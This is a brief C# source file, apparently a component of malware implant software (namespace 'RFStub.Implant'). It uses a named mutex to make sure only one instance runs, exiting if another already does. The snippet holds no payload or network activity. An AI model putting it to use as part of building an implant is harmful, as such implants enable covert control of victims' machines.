using System;
using System.Threading;

namespace RFStub.Implant;

internal sealed class MutexControl
{
	public static void Check()
	{
		bool createdNew = false;
		new Mutex(initiallyOwned: false, Config.Mutex, out createdNew);
		if (!createdNew)
		{
			Environment.Exit(1);
		}
	}
}
